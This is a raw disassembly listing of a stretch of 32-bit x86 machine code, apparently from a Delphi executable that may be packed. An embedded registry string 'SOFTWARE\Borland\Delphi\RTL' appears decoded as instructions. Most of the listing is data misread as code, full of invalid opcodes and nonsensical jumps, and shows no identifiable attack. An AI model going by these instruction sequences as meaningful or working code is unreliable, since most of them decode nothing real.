  46feb6:	ja     0x46fede
  46feb8:	mov    al,bl
  46feba:	mov    bl,BYTE PTR [eax-0x47ec7db8]
  46fec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  46fec1:	not    BYTE PTR [ecx+eiz*8-0x7cf0b3e5]
  46fec8:	loopne 0x46ff49
  46feca:	test   eax,esp
  46fecc:	sbb    eax,0x580536c4
  46fed1:	ret    
  46fed2:	push   eax
  46fed3:	push   edx
  46fed4:	inc    ebx
  46fed5:	popa   
  46fed6:	ret    
  46fed7:	shl    BYTE PTR es:[ebp+0x76],0x58
  46fedc:	jne    0x46fee4
  46fede:	xor    eax,eax
  46fee0:	ins    BYTE PTR es:[edi],dx
  46fee1:	stc    
  46fee2:	in     al,dx
  46fee3:	loope  0x46ff24
  46fee5:	imul   eax
  46fee7:	mov    ch,0x89
  46fee9:	jp     0x46ff22
  46feeb:	add    DWORD PTR [eax+0x1],esi
  46feee:	adc    al,0x89
  46fef0:	(bad)  
  46fef1:	mov    ebx,DWORD PTR [edx]
  46fef3:	inc    esp
  46fef4:	or     al,BYTE PTR [esi]
  46fef6:	je     0x46fef7
  46fef8:	mov    bh,bh
  46fefa:	xchg   BYTE PTR [ebx],ch
  46fefc:	cmp    BYTE PTR [esi+0x18],0x39
  46ff00:	ret    0x1b7f
  46ff03:	sub    eax,edx
  46ff05:	inc    eax
  46ff06:	add    al,0x7c
  46ff08:	adc    al,0x39
  46ff0a:	sar    DWORD PTR [edi+0x14],0x1
  46ff0e:	(bad)  
  46ff0f:	call   FWORD PTR [ebx]
  46ff11:	pop    esp
  46ff12:	icebp  
  46ff13:	mov    BYTE PTR [edi],cl
  46ff15:	inc    edi
  46ff16:	repz adc DWORD PTR ss:[edx+0x31e51701],edi
  46ff1e:	leave  
  46ff1f:	jmp    0x46ff0d
  46ff21:	mov    ecx,eax
  46ff23:	jmp    0x46ff0d
  46ff25:	mov    BYTE PTR [ebx-0x3f],bl
  46ff28:	mov    bl,0xa2
  46ff2a:	pop    es
  46ff2b:	mov    es,edx
  46ff2d:	xchg   BYTE PTR [edi+0x2cee1559],ah
  46ff33:	fadd   st(1),st
  46ff35:	repnz nop
  46ff37:	sbb    DWORD PTR [ecx-0x24438c2],ebx
  46ff3d:	jg     0x46ff04
  46ff3f:	mov    edi,edx
  46ff41:	bound  edi,QWORD PTR [ecx]
  46ff43:	div    DWORD PTR [edi+0x13]
  46ff46:	je     0x46ff77
  46ff48:	sar    ecx,0x2
  46ff4b:	js     0x46ff77
  46ff4d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  46ff4f:	xchg   BYTE PTR [ebx-0x2151fc1f],al
  46ff55:	jbe    0x46ffd6
  46ff57:	xor    ecx,DWORD PTR [eax-0x3ce8bbe]
  46ff5d:	lea    edi,[ecx+edi*1-0x4]
  46ff61:	xor    DWORD PTR [ecx],edx
  46ff63:	std    
  46ff64:	xor    eax,DWORD PTR [ebx-0x453a773a]
  46ff6a:	xlat   BYTE PTR ds:[ebx]
  46ff6b:	add    al,0xc7
  46ff6d:	ds cld 
  46ff6f:	inc    eax
  46ff70:	iret   
  46ff71:	mov    edx,0xc860275b
  46ff76:	out    dx,al
  46ff77:	call   0xc4bc:0x320aeb14
  46ff7e:	xlat   BYTE PTR ds:[ebx]
  46ff7f:	test   eax,0x8adc1802
  46ff84:	sbb    BYTE PTR [esi+0x67],ah
  46ff87:	mov    eax,0x4cfa20dd
  46ff8c:	and    BYTE PTR [esi-0x17],dh
  46ff8f:	sbb    BYTE PTR [eax+0xc7e2238],al
  46ff95:	jge    0x46ff9c
  46ff97:	cld    
  46ff98:	fstp   TBYTE PTR [eax+0x1]
  46ff9b:	push   cs
  46ff9c:	add    eax,0xeb020683
  46ffa1:	fbstp  TBYTE PTR [ebx]
  46ffa3:	in     eax,dx
  46ffa4:	push   ebp
  46ffa5:	jmp    0x470002
  46ffa7:	std    
  46ffa8:	(bad)  
  46ffa9:	dec    esi
  46ffaa:	fwait
  46ffab:	cmp    eax,DWORD PTR [eax+0x77]
  46ffae:	jmp    0x46ffc4
  46ffb0:	pop    ss
  46ffb1:	pop    es
  46ffb2:	mov    eax,DWORD PTR [edi]
  46ffb4:	sub    eax,DWORD PTR [esi]
  46ffb6:	add    ebp,eax
  46ffb8:	xchg   edx,eax
  46ffb9:	mov    ebx,0xa30a9816
  46ffbe:	pop    eax
  46ffbf:	fbld   TBYTE PTR [edi+0x0]
  46ffc2:	je     0x46ffe4
  46ffc4:	idiv   dl
  46ffc6:	mov    edx,0x77204ca5
  46ffcb:	sahf   
  46ffcc:	jae    0x46ff83
  46ffce:	cmp    eax,esi
  46ffd0:	mov    eax,0xb000b71b
  46ffd5:	rcl    DWORD PTR cs:[eax],0x92
  46ffd9:	imul   edx,DWORD PTR [ebx],0x2c
  46ffdc:	or     al,0xeb
  46ffde:	jnp    0x46ffe1
  46ffe0:	push   eax
  46ffe1:	cdq    
  46ffe2:	and    al,0x66
  46ffe4:	les    ebp,FWORD PTR [ebx-0x478c253c]
  46ffea:	mov    dl,BYTE PTR [esp+ebx*2+0x64]
  46ffee:	and    al,bl
  46fff0:	std    
  46fff1:	mov    BYTE PTR [edx+ebp*1],al
  46fff4:	inc    DWORD PTR [esi]
  46fff6:	inc    ebp
  46fff7:	daa    
  46fff8:	jb     0x46ffe6
  46fffa:	and    edi,ecx
  46fffc:	jmp    0x30b35484
  470001:	xchg   DWORD PTR [eax+0xf],eax
  470004:	xchg   DWORD PTR [edx-0x33],edi
  470007:	pop    edx
  470008:	add    DWORD PTR [ebx],edx
  47000a:	loop   0x470020
  47000c:	loope  0x47001f
  47000e:	push   ss
  47000f:	xor    ch,cl
  470011:	xchg   dh,al
  470013:	add    esp,0x779418f4
  470019:	icebp  
  47001a:	dec    ebp
  47001b:	mov    edi,0xf69c3321
  470020:	jne    0x470042
  470022:	push   0x4e8dea05
  470027:	jnp    0x47002a
  470029:	out    dx,eax
  47002a:	test   eax,0x58028550
  47002f:	mov    ecx,eax
  470031:	loop   0x470076
  470033:	inc    edi
  470034:	push   0xffffffd1
  470036:	std    
  470037:	xor    al,0x94
  470039:	jmp    0x47005c
  47003b:	daa    
  47003c:	dec    eax
  47003d:	sub    ebx,edx
  47003f:	(bad)  
  470042:	mov    al,0xdd
  470044:	sbb    al,0x84
  470046:	sbb    BYTE PTR [eax+0x74],dh
  470049:	or     BYTE PTR [eax-0x1814b1fd],ah
  47004f:	stos   BYTE PTR es:[edi],al
  470050:	jle    0x470046
  470052:	imul   ebx,DWORD PTR [esp+ecx*1-0x7e],0xfffffff7
  470057:	mov    ds:0xe2db7a20,ax
  47005d:	fldcw  WORD PTR ds:0xedaba837
  470063:	movnti DWORD PTR [eax+0x584cd9a4],edx
  47006a:	xchg   esi,eax
  47006b:	in     al,dx
  47006c:	or     bh,bl
  47006e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47006f:	imul   ecx,DWORD PTR [ecx],0x589b106c
  470075:	into   
  470076:	sbb    al,0x28
  470078:	clc    
  470079:	or     edi,DWORD PTR [ebx]
  47007b:	rol    DWORD PTR [esi],cl
  47007d:	adc    al,0x11
  47007f:	mov    eax,0x983361d2
  470084:	cld    
  470085:	push   ebp
  470086:	dec    DWORD PTR [edi+0x6e]
  470089:	mov    cx,WORD PTR [eax+0x4]
  47008d:	sub    cx,0xd7b1
  470092:	mov    cl,BYTE PTR [ecx+0x66]
  470095:	sub    ecx,0x2
  470098:	jae    0x4700a6
  47009a:	mov    bh,0xef
  47009c:	mov    edx,0xf2ff5c15
  4700a1:	fsubr  st,st(3)
  4700a3:	sbb    esi,DWORD PTR [eax-0x15]
  4700a6:	pop    ss
  4700a7:	cmp    eax,0x74608218
  4700ac:	pop    es
  4700ad:	cmp    eax,0xc0ebf75f
  4700b2:	in     al,0x83
  4700b4:	cld    
  4700b5:	add    al,0x22
  4700b7:	add    eax,0xc07a67bb
  4700bc:	pop    es
  4700bd:	jecxz  0x4700ba
  4700bf:	mov    ds:0xd0c38bca,al
  4700c4:	pop    ds
  4700c5:	mov    edx,DWORD PTR [eax+0x1c]
  4700c8:	sbb    al,0x1e
  4700ca:	mov    WORD PTR [ebp-0x5082d497],gs
  4700d0:	je     0x470082
  4700d2:	inc    ebx
  4700d3:	cmp    eax,0x35f872ae
  4700d8:	sti    
  4700d9:	mov    bh,0x2f
  4700db:	or     dh,BYTE PTR [ebx+0x662977d7]
  4700e1:	and    eax,0x612d7b2
  4700e6:	jne    0x47015a
  4700e8:	call   DWORD PTR [ebx+0x1c]
  4700eb:	adc    BYTE PTR [ebp+0x162460ef],0x15
  4700f2:	and    al,0x74
  4700f4:	sbb    ebp,DWORD PTR [esi-0x3b100f96]
  4700fa:	sahf   
  4700fb:	jmp    0x47010f
  4700fd:	cmp    ebx,0xb8784a4c
  470103:	sar    edi,cl
  470105:	mov    edi,0xc6c76600
  47010a:	aaa    
  47010b:	mov    bl,BYTE PTR [edx]
  47010d:	cmp    cl,bl
  47010f:	jbe    0x470113
  470111:	mov    ecx,ebx
  470113:	mov    BYTE PTR [eax],cl
  470115:	inc    edx
  470116:	in     al,0x80
  470118:	and    esp,ecx
  47011a:	inc    eax
  47011b:	and    ecx,0x8adb92ce
  470121:	fwait
  470122:	sahf   
  470123:	sbb    al,0x6f
  470125:	and    esp,esp
  470127:	xor    edx,edx
  470129:	mov    cl,BYTE PTR [esi-0x1]
  47012c:	(bad)  
  47012d:	mov    edi,0x474617e9
  470132:	fdiv   QWORD PTR [edi+0x2]
  470135:	add    edx,eax
  470137:	push   edx
  470138:	shr    edx,0x2
  47013b:	je     0x470163
  47013d:	mov    ecx,DWORD PTR [esi]
  47013f:	mov    ebx,DWORD PTR [edi]
  470141:	cmp    ecx,ebx
  470143:	jne    0x470189
  470145:	dec    edx
  470146:	je     0x47015d
  470148:	mov    ebp,DWORD PTR [edi-0x66]
  47014b:	fiadd  WORD PTR [esi+0x45fd04e]
  470151:	sbb    BYTE PTR [edi],dh
  470153:	sbb    cl,BYTE PTR [eax]
  470155:	or     BYTE PTR [edx+0x75],cl
  470158:	loop   0x470159
  47015a:	jmp    FWORD PTR [edi-0x26]
  47015d:	jmp    0x470165
  47015f:	adc    al,0x4
  470161:	add    al,0x5a
  470163:	and    edx,0x3
  470166:	je     0x470184
  470168:	mov    cl,BYTE PTR [esi]
  47016a:	cmp    cl,BYTE PTR [edi]
  47016c:	jne    0x47019d
  47016e:	dec    edx
  47016f:	je     0x470184
  470171:	mov    cl,BYTE PTR [esi+0x1]
  470174:	cmp    bh,ch
  470176:	aaa    
  470177:	dec    ebp
  470178:	repz dec edi
  47017a:	add    DWORD PTR [ebp+0x24],esi
  47017d:	or     BYTE PTR [edx],al
  47017f:	add    dh,BYTE PTR [ebp+0x19]
  470182:	add    eax,eax
  470184:	jmp    0x47019b
  470186:	pop    edx
  470187:	cmp    BYTE PTR [eax+0x5e],ah
  47018a:	aad    0xbf
  47018c:	jbe    0x47019e
  47018e:	cmp    ch,bh
  470190:	jne    0x47019e
  470192:	shr    ecx,0x10
  470195:	adc    BYTE PTR fs:[edx],bl
  470198:	add    bh,BYTE PTR [esi]
  47019a:	ja     0x47021b
  47019c:	pop    es
  47019d:	ja     0x4701f0
  47019f:	mov    esi,ecx
  4701a1:	shr    esi,0xe1
  4701a4:	or     BYTE PTR [ebx+0x724e451a],cl
  4701aa:	jae    0x470151
  4701ac:	jns    0x4701f6
  4701ae:	pop    edx
  4701af:	cmp    BYTE PTR [ebx+0x4e08c2c0],al
  4701b5:	iret   
  4701b6:	mov    edi,0xc2c0e6f9
  4701bb:	add    al,0x5e
  4701bd:	and    esi,0x36
  4701c0:	mov    cl,BYTE PTR [eax]
  4701c2:	cmp    cl,BYTE PTR [edx]
  4701c4:	jne    0x4701f6
  4701c6:	dec    esi
  4701c7:	dec    eax
  4701c8:	call   0x4e25:0x4a34d9e6
  4701cf:	dec    eax
  4701d0:	dec    edx
  4701d1:	sbb    dl,BYTE PTR [ecx]
  4701d3:	add    ch,ah
  4701d5:	or     DWORD PTR [eax+esi*4-0x28211ca2],ebx
  4701dc:	mul    dh
  4701de:	scas   al,BYTE PTR es:[edi]
  4701df:	add    al,0xc7
  4701e1:	mov    ch,cl
  4701e3:	shl    eax,0x10
  4701e6:	data16 or cl,BYTE PTR [ecx+0x1b8109d1]
  4701ed:	push   esi
  4701ee:	mov    esi,0x89abf309
  4701f3:	shr    DWORD PTR [edx+0x5f50275f],1
  4701f9:	mov    ebp,0x6c30d0fd
  4701fe:	sub    al,0xdb
  470200:	mov    edi,0x8a0c00cc
  470205:	push   ds
  470206:	inc    esi
  470207:	mov    ds:0x5cb5f874,al
  47020c:	imul   ebp,DWORD PTR [esi-0x49],0x742d0c00
  470213:	bound  ecx,QWORD PTR [eax]
  470215:	sub    esi,DWORD PTR [edi+ebx*2+0x24]
  470219:	js     0x47028f
  47021b:	pop    edx
  47021c:	sub    ch,ch
  47021e:	fstp   st(4)
  470220:	pop    eax
  470221:	je     0x470278
  470223:	xor    BYTE PTR [ebp+0x13],dh
  470226:	dec    edi
  470227:	and    cl,BYTE PTR [eax+0x43]
  47022a:	outs   dx,DWORD PTR ds:[esi]
  47022b:	inc    ebp
  47022c:	mov    eax,0xeb20489f
  470231:	add    al,0xa
  470233:	dec    eax
  470234:	xor    BYTE PTR [edx],ah
  470236:	or     DWORD PTR [edi+0x25],esi
  470239:	cmp    DWORD PTR [edi],esi
  47023b:	loopne 0x470273
  47023d:	cld    
  47023e:	clc    
  47023f:	ja     0x470262
  470241:	lea    eax,[eax+eax*4]
  470244:	push   ds
  470245:	add    eax,ebx
  470247:	push   edx
  470248:	mov    dh,0xe6
  47024a:	dec    ch
  47024c:	(bad)  
  47024d:	mov    edi,0x974dbe0
  470252:	sar    BYTE PTR [ebp+0x54],cl
  470255:	jmp    0x470260
  470257:	inc    esi
  470258:	mov    esp,0x4b7ed8f7
  47025d:	js     0x4702a8
  47025f:	pop    ebx
  470260:	sub    esi,ebx
  470262:	jmp    0x4702ab
  470264:	inc    ch
  470266:	jbe    0x470263
  470268:	cmp    eax,0x9ceb40fd
  47026d:	mov    edi,0x74550f40
  470272:	fild   WORD PTR [edx-0x6dfc8d9f]
  470278:	mov    esp,0x20b3b4df
  47027d:	cdq    
  47027e:	jbe    0x47028b
  470280:	push   cs
  470281:	adc    DWORD PTR ds:0xc380d077,eax
  470287:	or     ch,BYTE PTR [esi-0x799fb237]
  47028d:	adc    eax,0xd5ab049c
  470292:	(bad)  
  470293:	cwde   
  470294:	pop    ecx
  470295:	cmp    bh,al
  470297:	cdq    
  470298:	hlt    
  470299:	xor    esi,esi
  47029b:	mov    DWORD PTR [edx],esi
  47029d:	xchg   edi,eax
  47029e:	mov    ecx,0x482129ff
  4702a3:	scas   eax,DWORD PTR es:[edi]
  4702a4:	jecxz  0x470293
  4702a6:	ds mov esi,0x1df98150
  4702ac:	jbe    0x4702b3
  4702ae:	sub    edi,DWORD PTR [edx]
  4702b0:	inc    edx
  4702b1:	mov    esp,0x2b0e3906
  4702b6:	inc    BYTE PTR [eax-0x78]
  4702b9:	sbb    BYTE PTR [ecx+0x75],cl
  4702bc:	repz pop edx
  4702be:	dec    BYTE PTR [eax+0x792d4602]
  4702c4:	in     al,0xec
  4702c6:	sbb    al,0x59
  4702c8:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4702ca:	mov    BYTE PTR [edi+0x478821f6],al
  4702d0:	jp     0x470253
  4702d2:	inc    ecx
  4702d3:	sub    BYTE PTR [esp+edi*2+0x4d],ah
  4702d7:	je     0xd9364081
  4702dd:	ins    BYTE PTR es:[edi],dx
  4702de:	rol    BYTE PTR [eax],1
  4702e0:	adc    al,0xca
  4702e2:	lea    eax,[ecx+0x1f12c289]
  4702e8:	lea    edx,[edx+edx*4]
  4702eb:	mov    ebx,0xdbfb417b
  4702f0:	lods   al,BYTE PTR ds:[esi]
  4702f1:	push   ebx
  4702f2:	aas    
  4702f3:	xor    bl,BYTE PTR [esi+ebx*8+0x24]
  4702f7:	call   0x2bc07701
  4702fc:	pcmpeqb mm1,QWORD PTR [edi+ebp*1]
  470300:	mov    ecx,0x75391e1d
  470305:	xor    eax,DWORD PTR [esp+esi*2]
  470308:	popa   
  470309:	push   cs
  47030a:	and    BYTE PTR [ebx+0xb],al
  47030d:	xor    al,0xc
  47030f:	in     eax,dx
  470310:	daa    
  470311:	pop    eax
  470312:	jmp    0x470367
  470314:	pop    edx
  470315:	xchg   ecx,eax
  470316:	jge    0x47035e
  470318:	mov    ecx,edi
  47031a:	and    eax,0x34a92995
  47031f:	stc    
  470320:	sbb    al,0xc1
  470322:	mov    ax,0xf9ff
  470326:	jmp    0x470336
  470328:	fstp   st(0)
  47032a:	fld    TBYTE PTR [ebx+0x12e86835]
  470330:	fldz   
  470332:	mov    bl,al
  470334:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  470335:	loopne 0x47033b
  470337:	xor    esp,ebx
  470339:	jg     0x47034e
  47033b:	cmp    DWORD PTR [ecx+edi*8],0xffffffe4
  47033f:	aas    
  470340:	mov    al,ds:0x5c84002
  470345:	cli    
  470346:	ds stc 
  470348:	in     al,0x93
  47034a:	or     BYTE PTR [eax-0x64],al
  47034d:	or     al,0x50
  47034f:	ret    
  470350:	mov    esp,tr6
  470353:	adc    bl,BYTE PTR [edi]
  470355:	stc    
  470356:	enter  0x8047,0x96
  47035a:	cwde   
  47035b:	push   ss
  47035c:	and    BYTE PTR [esi+edi*4-0x1194d7e7],bh
  470363:	sbb    al,0xbe
  470365:	cld    
  470366:	in     eax,0x23
  470368:	stc    
  470369:	add    dl,BYTE PTR [ebp+0x43b74020]
  47036f:	mov    edx,0xd4a51023
  470374:	sti    
  470375:	xchg   ebp,eax
  470376:	outs   dx,DWORD PTR ds:[esi]
  470377:	pop    ds
  470378:	lock (bad) 
  47037a:	in     eax,0x26
  47037c:	sub    ah,bh
  47037e:	test   BYTE PTR [ecx+0x20f4802a],dl
  470384:	out    0xb5,al
  470386:	sub    eax,0x2bf2bf13
  47038b:	mov    edi,0x5fa931a0
  470390:	jecxz  0x4703c2
  470392:	add    al,0xbf
  470394:	leave  
  470395:	sbb    ecx,DWORD PTR [esi-0x43d13acc]
  47039b:	mov    ds:0xff3f37b1,al
  4703a0:	repz aas 
  4703a2:	inc    eax
  4703a3:	jbe    0x4703df
  4703a5:	imul   ecx,DWORD PTR [ebx],0xffffffde
  4703a8:	cmp    ch,al
  4703aa:	mov    DWORD PTR [ebx+eiz*1],eax
  4703ad:	(bad)  
  4703ae:	mov    bh,BYTE PTR [esi]
  4703b0:	bound  ebp,QWORD PTR [ebp+eax*8-0xc806404]
  4703b7:	jmp    0x470431
  4703b9:	lods   eax,DWORD PTR ds:[esi]
  4703ba:	inc    ecx
  4703bb:	cmp    BYTE PTR [edx+0x17],0xb7
  4703bf:	xlat   BYTE PTR es:[ebx]
  4703c1:	fadd   DWORD PTR [eax+edx*4-0x54]
  4703c5:	outs   dx,BYTE PTR ds:[esi]
  4703c6:	xor    bh,BYTE PTR [eax-0x7a]
  4703c9:	xchg   DWORD PTR [eax-0x1],ecx
  4703cc:	jmp    esi
  4703ce:	fbstp  TBYTE PTR [edi+edx*2+0x68163f0a]
  4703d5:	test   eax,0xcceda14b
  4703da:	into   
  4703db:	sbb    eax,edx
  4703dd:	ror    DWORD PTR [esi+0x40],cl
  4703e0:	mov    al,ds:0x61401484
  4703e5:	push   ecx
  4703e6:	pop    ecx
  4703e7:	jmp    FWORD PTR [edi+0x5284fffa]
  4703ed:	inc    eax
  4703ee:	enter  0x19a5,0x90
  4703f2:	mov    ecx,0x55a56fa5
  4703f7:	inc    eax
  4703f8:	push   edx
  4703f9:	and    ah,dh
  4703fb:	daa    
  4703fc:	(bad)  
  4703fd:	retf   
  4703fe:	into   
  4703ff:	pop    eax
  470400:	inc    eax
  470401:	test   BYTE PTR [ecx],cl
  470403:	xchg   esp,eax
  470404:	clc    
  470405:	(bad)  
  470406:	(bad)  
  470407:	(bad)  
  470408:	(bad)  
  470409:	js     0x470444
  47040b:	aas    
  47040c:	sbb    DWORD PTR [eax+eax*2-0x1b],0xd736b90b
  470414:	pop    es
  470415:	(bad)  
  470416:	mov    eax,ds:0x4edf405f
  47041b:	addr16 add al,0xcd
  47041e:	leave  
  47041f:	repnz leave 
  470421:	bound  eax,QWORD PTR [eax-0x6a]
  470424:	and    al,BYTE PTR [ecx+0x7f7c4045]
  47042a:	sti    
  47042b:	(bad)  
  47042c:	jmp    FWORD PTR [edi-0x4]
  47042f:	gs inc eax
  470431:	sahf   
  470432:	mov    ch,0x70
  470434:	sub    ebp,DWORD PTR [eax+0x699dc5ad]
  47043a:	inc    eax
  47043b:	aad    0xa6
  47043d:	iret   
  47043e:	dec    DWORD PTR [ecx+0x1f]
  470441:	js     0x4703f7
  470443:	inc    eax
  470444:	mov    ds:0x16c59b14,eax
  470449:	stos   DWORD PTR es:[edi],eax
  47044a:	(bad)  
  47044b:	(bad)  
  47044c:	(bad)  
  47044d:	push   DWORD PTR [ebx-0x1fbec211]
  470453:	mov    ecx,gs
  470455:	or     cl,0x47
  470458:	mov    edx,0xaa41a893
  47045d:	pop    ss
  47045e:	out    0x7f,al
  470460:	sub    esp,DWORD PTR [ecx+0x4212b616]
  470466:	imul   edx,DWORD PTR [ebp+0x27],0x39
  47046a:	(bad)  
  47046b:	div    DWORD PTR [eax-0x20]
  47046e:	jmp    FWORD PTR [edi+0x427cfff8]
  470474:	xor    cl,cl
  470476:	cmp    al,0xe3
  470478:	call   DWORD PTR [esi+0x42e78a52]
  47047e:	mov    cs,WORD PTR [eax-0x63]
  470481:	sti    
  470482:	jmp    0x470502
  470484:	stos   BYTE PTR es:[edi],al
  470485:	push   ecx
  470486:	inc    ebx
  470487:	mov    WORD PTR [edi],gs
  470489:	push   0x5c
  47048b:	sbb    edi,edi
  47048d:	(bad)  
  47048e:	(bad)  
  47048f:	(bad)  
  470490:	cld    
  470491:	sar    BYTE PTR es:[ebx-0x331c89bd],cl
  470498:	repnz sub DWORD PTR [edi],ebp
  47049b:	test   BYTE PTR [ecx+0xad24426],al
  4704a1:	nop
  4704a2:	fild   DWORD PTR [eax]
  4704a4:	daa    
  4704a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4704a6:	lahf   
  4704a7:	nop
  4704a8:	inc    esp
  4704a9:	pop    ss
  4704aa:	stos   BYTE PTR es:[edi],al
  4704ab:	clc    
  4704ac:	scas   al,BYTE PTR es:[edi]
  4704ad:	adc    bl,ah
  4704af:	(bad)  
  4704b2:	(bad)  
  4704b3:	inc    esp
  4704b5:	cli    
  4704b6:	inc    esp
  4704b7:	pop    ecx
  4704b8:	pushf  
  4704b9:	mov    al,0xe9
  4704bb:	pop    es
  4704bc:	pushf  
  4704bd:	mov    dh,dl
  4704bf:	fs inc ebp
  4704c1:	aam    0xf3
  4704c3:	imul   ebx
  4704c5:	loope  0x470511
  4704c7:	jp     0x47045e
  4704c9:	iret   
  4704ca:	inc    ebp
  4704cb:	bound  esp,QWORD PTR [edx-0x2723f86b]
  4704d1:	ds mov eax,0xffffff39
  4704d7:	inc    DWORD PTR [esi-0x39]
  4704da:	xchg   ecx,eax
  4704db:	push   cs
  4704dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4704dd:	scas   al,BYTE PTR es:[edi]
  4704de:	mov    al,ds:0x46a3e319
  4704e3:	pop    ss
  4704e4:	or     al,0x75
  4704e6:	add    DWORD PTR [esi+0x48c97675],0x93a7e44d
  4704f0:	cmp    DWORD PTR [ebx],edi
  4704f2:	xor    eax,0x53edb2b8
  4704f7:	in     eax,0xbf
  4704f9:	jmp    0x4704fa
  4704fb:	call   FWORD PTR [ebp+0x3d]
  4704fe:	lds    ebx,FWORD PTR [ebp+0x3b]
  470501:	mov    ebx,DWORD PTR [esi-0xf59a56e]
  470507:	mov    eax,ds:0xa554c020
  47050c:	mov    WORD PTR [edi],?
  47050e:	popa   
  47050f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  470510:	mov    ebx,eax
  470512:	and    eax,0xfff9895d
  470517:	(bad)  
  470518:	(bad)  
  470519:	(bad)  
  47051a:	(bad)  [edi-0x8]
  47051d:	repz daa 
  47051f:	mov    edi,0xdd5dc8a2
  470524:	sub    BYTE PTR [esi-0x65],0x97
  470528:	and    BYTE PTR [edx-0x3b9fadfe],cl
  47052e:	and    eax,0xd559f075
  470533:	outs   dx,BYTE PTR ds:[esi]
  470534:	bound  edx,QWORD PTR [ecx]
  470536:	xor    eax,0x3d7bcaae
  47053b:	lock mov ds:0x25ffc3f0,eax
  470541:	mov    eax,0xdbdb330f
  470546:	and    al,0xc0
  470548:	inc    esi
  470549:	jg     0x47054a
  47054b:	ins    BYTE PTR es:[edi],dx
  47054c:	cmp    eax,0x7
  47054f:	jne    0x47056d
  470551:	push   0x1
  470553:	pop    ss
  470554:	and    eax,0xdf3ff00
  470559:	add    BYTE PTR [eax],al
  47055b:	xor    BYTE PTR ds:0xdc68c6b5,bh
  470561:	icebp  
  470562:	shr    BYTE PTR [edi-0x3a],0x10
  470566:	xchg   edi,eax
  470567:	hlt    
  470568:	movzx  eax,WORD PTR ds:0x2a66cac
  47056f:	mov    ch,ah
  470571:	lea    ebp,[edx+0x68]
  470574:	test   BYTE PTR [eax+0x40],ch
  470577:	add    DWORD PTR [edi],0x68d02c50
  47057d:	add    bh,cl
  47057f:	add    eax,0x2faab34
  470584:	mov    al,0x4d
  470586:	ficomp WORD PTR [ecx]
  470588:	xor    eax,0x3e21b6d3
  47058d:	mov    DWORD PTR [ebp-0xc],0x50f45e4c
  470594:	data16 clc 
  470596:	pushf  
  470597:	or     bh,BYTE PTR [eax]
  470599:	dec    edi
  47059a:	add    BYTE PTR [ebp+ebp*8+0x2],bl
  47059e:	mov    eax,0x661b5c66
  4705a3:	sbb    esp,DWORD PTR [eax]
  4705a5:	sub    ebp,DWORD PTR [eax-0x41ccacf9]
  4705ab:	jnp    0x47059c
  4705ad:	mov    ax,ds:0xc02566e1
  4705b3:	jmp    DWORD PTR [esi-0x64]
  4705b6:	pop    dx
  4705b8:	xchg   ebx,eax
  4705b9:	inc    edx
  4705ba:	inc    edi
  4705bb:	js     0x4705fc
  4705bd:	or     ax,dx
  4705c0:	leave  
  4705c1:	rcl    BYTE PTR [edx],1
  4705c3:	(bad)  
  4705c4:	(bad)  
  4705c5:	(bad)  
  4705c6:	jg     0x47061b
  4705c8:	dec    edi
  4705c9:	inc    esi
  4705ca:	push   esp
  4705cb:	push   edi
  4705cc:	inc    ecx
  4705cd:	push   edx
  4705ce:	inc    ebp
  4705cf:	pop    esp
  4705d0:	inc    edx
  4705d1:	outs   dx,DWORD PTR ds:[esi]
  4705d2:	jb     0x470640
  4705d4:	popa   
  4705d5:	outs   dx,BYTE PTR ds:[esi]
  4705d6:	fs pop esp
  4705d8:	inc    esp
  4705d9:	gs ins BYTE PTR es:[edi],dx
  4705db:	jo     0x470645
  4705dd:	imul   ebx,DWORD PTR [edx+edx*2+0x54],0x5046004c
  4705e5:	push   ebp
  4705e6:	jp     0x4705aa
  4705e8:	xchg   ebp,eax
  4705e9:	dec    DWORD PTR [ebp+0x61]
  4705ec:	jae    0x470659
  4705ee:	push   esi
  4705ef:	popa   
  4705f0:	ins    BYTE PTR es:[edi],dx
  4705f1:	jne    0x470658
  4705f3:	fninit 
  4705f5:	fwait
  4705f6:	sub    eax,0xb85c27d7
  4705fb:	(bad)  
  4705fc:	push   ecx
  4705fd:	pop    esp
  4705fe:	gs daa 
  470600:	cli    
  470601:	adc    eax,0x8bd7fff9
  470606:	jo     0x4705dc
  470608:	xor    ecx,ecx
  47060a:	mov    cl,BYTE PTR [esi]
  47060c:	inc    ecx
  47060d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47060f:	push   ss
  470610:	or     edx,edx
  470612:	add    esi,edi
  470614:	fild   QWORD PTR [ebp+0x2d408b0e]
  47061a:	or     BYTE PTR [ebx],bh
  47061c:	dec    edx
  47061d:	cld    
  47061e:	jne    0x470630
  470620:	dec    edx
  470621:	mov    bh,BYTE PTR [ecx+eax*1]
  470624:	xor    bh,BYTE PTR [esi+esi*1]
  470627:	ror    BYTE PTR [esi],1
  470629:	out    dx,eax
  47062a:	jp     0x470613
  47062c:	fbstp  TBYTE PTR [ebp+0x4]
  47062f:	mov    ds:0xd88843f2,al
  470634:	cs inc eax
  470636:	fcom   QWORD PTR [ebx]
  470638:	xchg   esp,eax
  470639:	jo     0x470656
  47063b:	mov    al,ds:0xeea78b02
  470640:	or     ebp,ebp
  470642:	scas   eax,DWORD PTR es:[edi]
  470643:	sbb    eax,0x1a7825a9
  470648:	mov    eax,0x3c261bd0
  47064d:	pop    ebx
  47064e:	aaa    
  47064f:	out    dx,eax
  470650:	add    eax,esi
  470652:	jnp    0x47067a
  470654:	xchg   esp,eax
  470655:	or     eax,0xc0be541a
  47065a:	fsubr  DWORD PTR [edi-0x11]
  47065d:	xchg   ecx,eax
  47065e:	pop    esp
  47065f:	mov    al,0x84
  470661:	rol    BYTE PTR [esi-0xa],1
  470664:	sub    DWORD PTR [eax+0x16],edx
  470667:	lar    ebx,WORD PTR [ecx+0x10]
  47066b:	ja     0x47067e
  47066d:	test   al,0x64
  47066f:	(bad)  
  470670:	and    DWORD PTR [eax-0x459354c2],ebx
  470676:	ret    
  470677:	xor    DWORD PTR [eax+0x6ea0057e],edi
  47067d:	loopne 0x470686
  47067f:	mov    dl,0x17
  470681:	mov    esp,0x82c2bc4
  470686:	call   DWORD PTR [ecx-0x4]
